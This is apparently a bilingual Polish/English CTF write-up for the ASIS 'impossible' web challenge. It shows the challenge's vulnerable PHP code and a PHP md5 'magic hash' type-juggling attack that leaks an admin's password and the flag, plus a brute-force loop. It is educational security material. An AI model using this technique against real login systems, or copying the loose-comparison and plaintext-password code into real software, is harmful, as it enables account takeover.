## impossible (web, 225p)

### pl
[eng](#eng-version)

według opisu zadania, flaga jest schowana na stronie http://impossible.asis-ctf.ir/
możemy tam zakładać konta, ale muszą one zostać aktywowane żeby się zalogować.
jak zwykle zaczynamy od ściągnięcia `robots.txt` aby sprawdzić co autorzy strony chcą przed nami ukryć.
http://impossible.asis-ctf.ir/robots.txt ma tylko jeden wpis:

    user-agent: *
    disallow: /backup

pod http://impossible.asis-ctf.ir/backup/ znajdziemy zrzut całej strony. znacząco ułatwia nam to zadanie.

w `functions.php` znajduje się mini-implementacja bazy danych:

	function username_exist($username) {
		$data = file_get_contents('../users.dat');
		$users = explode("\n", $data);
		foreach ($users as $key => $value) {
			$user_data = explode(",", $value);
			if ($user_data[2] == '1' && base64_encode($username) == $user_data[0]) {
				return true;
			}
		}
		return false;
	}

	function add_user($username, $email, $password) {
		file_put_contents("../users.dat", base64_encode($username) . "," . base64_encode($email) . ",0\n", $flag = file_append);
		file_put_contents("../passwords.dat", md5($username) . "," . base64_encode($password) . "\n", $flag = file_append);
	}

	function get_user($username) {
		$data = file_get_contents('../passwords.dat');
		$passwords = explode("\n", $data);
		foreach ($passwords as $key => $value) {
			$user_data = explode(",", $value);
			if (md5($username) == $user_data[0]) {
				return array($username, base64_decode($user_data[1]));
			}
		}
		return array("", "");
	}

`register.php` umożliwia nam stworzenie nowego konta - o ile nie istnieje już jakieś o tej samej nazwie:
	
	$check = preg_match("/^[a-za-z0-9]+$/", $_post['username']);
	if (!$check) {
	} elseif (username_exist($_post['username'])) {
		$result = 1;
		$title = "registration failed";
	} else {
		add_user($_post['username'], $_post['email'], $_post['password']);
		$user_info = get_user($_post['username']);
		$result = 2;
		$title = "registration complete";
	}

`index.php` umożliwia zalogowanie się - o ile użytkownik jest aktywny i ma pasujące hasło:

	if(username_exist($_post['username'])) {
		$user_info = get_user($_post['username']);
		if ($user_info[1] == $_post['password']) {
			$login = true;
		}
	}

nasz atak wykorzystuje kilka luk:

1. w `passwords.dat` nazwy użytkownika są zahaszowane md5 ale hasła są tylko zakodowane base64.
2. `register.php` wypisuje hasło nowo utworzonego użytkownika. albo, dokładniej, hasło pierwszego użytkownika którego nazwa ma takie samo md5.
3. skróty md5 są porównywane operatorem `==`. jeżeli porównywane łańcuchy są poprawnymi liczbami, zostaną porównane jako liczby.
4. dziwnym zbiegiem okoliczności aktywny użytkownik z takim numerycznym md5 już istnieje w bazie: `md5("adm2salwg") == "0e004561083131340065739640281486"`

`0e004561083131340065739640281486` po przekonwertowaniu na liczbę jest równe 0 (w notacji matematycznej 0*10<sup>4561083131340065739640281486</sup>). potrzebna nam będzie inna nazwa, której md5 jest również równe 0 po skonwertowaniu na liczbę.
nawet w php, przeszukując kolejne liczby dostaniemy wynik po zaledwie kilku minutach:

	$p = md5("adm2salwg");
	$i = 0;
	while(true) {
		if(md5("".$i) == $p) {
			echo $i;
		}
		$i++;
	}

pierwsze rozwiązanie: `240610708` nie zadziałało. użytkownik z taką nazwą już istniał w bazie. drugie rozwiązanie: `314282422` zadziałało bez problemu.
wystarczy stworzyć nowe konto o nazwie: `314282422` a skrypt odeśle nam hasło użytkownika `adm2salwg`:

    1w@ewes$%rq0

po zalogowaniu jako `adm2salwg`, pojawia się flaga:

	asis{d9fb4932eb4c45aa793301174033dff9}

skrypty posiadają jeszcze jedną, potencjalnie użyteczną, lukę. `file_put_contents` nie jest operacją atomową.
przez rejestrację wielu użytkowników z długimi nazwami i emailami równolegle, powinno się dać utworzyć niepoprawne wpisy w obu plikach.
nie udało nam się tego jednak wykorzystać.

### eng version

the flag is supposed to be hidden here: http://impossible.asis-ctf.ir/
it looks like we can add new accounts, but they must be activated before logging in.
as usual, we start by examining `robots.txt` to find what we are not supposed to look at.
http://impossible.asis-ctf.ir/robots.txt contains just two lines:

    user-agent: *
    disallow: /backup

http://impossible.asis-ctf.ir/backup/ contains dump of the whole site which is going to make the whole thing a lot easier.

`functions.php` contains an ad-hoc implementation of a database:

	function username_exist($username) {
		$data = file_get_contents('../users.dat');
		$users = explode("\n", $data);
		foreach ($users as $key => $value) {
			$user_data = explode(",", $value);
			if ($user_data[2] == '1' && base64_encode($username) == $user_data[0]) {
				return true;
			}
		}
		return false;
	}

	function add_user($username, $email, $password) {
		file_put_contents("../users.dat", base64_encode($username) . "," . base64_encode($email) . ",0\n", $flag = file_append);
		file_put_contents("../passwords.dat", md5($username) . "," . base64_encode($password) . "\n", $flag = file_append);
	}

	function get_user($username) {
		$data = file_get_contents('../passwords.dat');
		$passwords = explode("\n", $data);
		foreach ($passwords as $key => $value) {
			$user_data = explode(",", $value);
			if (md5($username) == $user_data[0]) {
				return array($username, base64_decode($user_data[1]));
			}
		}
		return array("", "");
	}

`register.php` allows you to add new account, unless one already exists and is active:
	
	$check = preg_match("/^[a-za-z0-9]+$/", $_post['username']);
	if (!$check) {
	} elseif (username_exist($_post['username'])) {
		$result = 1;
		$title = "registration failed";
	} else {
		add_user($_post['username'], $_post['email'], $_post['password']);
		$user_info = get_user($_post['username']);
		$result = 2;
		$title = "registration complete";
	}

`index.php` allows you to login, if user is active and has matching password:

	if(username_exist($_post['username'])) {
		$user_info = get_user($_post['username']);
		if ($user_info[1] == $_post['password']) {
			$login = true;
		}
	}

our exploit leverages several issues in those scripts.

1. `passwords.dat` contains md5 sums of user names but passwords are base64 encoded.
2. `register.php` will echo your password back to you. or, actually, password of first user whose name has the same md5 as yours.
3. md5s are compared using == operator. if compared strings are valid numbers, they will be parsed first.
4. by strange coincidence active user with such numeric md5 already exists in the database: `md5("adm2salwg") == "0e004561083131340065739640281486"`

`0e004561083131340065739640281486` parses to number 0. we just need a different user name which md5 also parses to 0.
brute forcing that, even in php, only takes a couple of minutes.

	$p = md5("adm2salwg");
	$i = 0;
	while(true) {
		if(md5("".$i) == $p) {
			echo $i;
		}
		$i++;
	}

first solution: `240610708` didn't work. there already was an account with that name. but the second one: `314282422` worked fine.
all you have to do is create account with user name: `314282422` and script will echo you `adm2salwg`'s password:

    1w@ewes$%rq0

after logging in as `adm2salwg`, flag is displayed:

	asis{d9fb4932eb4c45aa793301174033dff9}

there is one more potentially critical issue in those scripts. `file_put_contents` is not atomic.
by registering a lot of users with long names and emails, it should be possible to create bogus entries in both databases.
we weren't able to exploit it though.